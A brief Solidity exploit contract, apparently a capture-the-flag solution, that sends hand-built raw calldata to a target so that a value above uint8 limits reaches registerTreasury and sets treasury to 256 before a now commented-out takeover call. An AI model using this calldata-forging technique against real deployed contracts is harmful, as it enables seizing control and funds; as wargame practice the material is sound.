// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 0xe673B5B1A8c9E2e137A90Da533AB18C15A23939e
interface IHighOrder {
    function commander() external view returns (address);

    function treasury() external view returns (uint256);

    function registerTreasury(uint8) external; //  0x211c85ab

    function claimLeadership() external;
}

contract Hack {
    constructor(address _target) {
        bytes
            memory data = hex"211c85ab0000000000000000000000000000000000000000000000000000000000000100";
        (bool ok, ) = _target.call(data);
        require(ok, "call  fail"); // treasury=256

        // IHighOrder(_target).claimLeadership();
        // require(IHighOrder(_target).commander()==msg.sender, "pwn  fail");
    }
}
